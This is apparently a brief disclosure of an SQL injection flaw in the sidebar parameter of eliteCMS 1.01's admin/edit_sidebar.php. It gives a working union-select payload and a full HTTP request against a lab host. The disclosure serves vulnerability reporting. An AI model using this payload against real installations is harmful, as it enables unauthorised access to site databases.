# Elitecms v1.01 by elitecms has SQL injection

vendors: https://elitecms.net/download.php

Vulnerability File: /admin/edit_sidebar.php

Vulnerability location: ip/eliteCMS1.01/admin/edit_sidebar.php?page=2&sidebar=, sidebar

dbname: elitecms101

[+] Payload: /eliteCMS1.01/admin/edit_sidebar.php?page=2&sidebar=-3%20union%20select%201,2,database(),4,5--+ // Leak place ---> sidebar

```sql
GET /eliteCMS1.01/admin/edit_sidebar.php?page=2&sidebar=-3%20union%20select%201,2,database(),4,5--+ HTTP/1.1
Host: 192.168.1.108
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=307ef75a2f3ab4c1103d8a1e90cf120e
Connection: close
```
![image](https://user-images.githubusercontent.com/54017627/167534763-b084791d-07d8-4a59-8200-9be6f7c98cb2.png)

![image](https://user-images.githubusercontent.com/54017627/167534625-0c2fa0a3-b169-4bc4-82c4-8c9a8478ce9d.png)
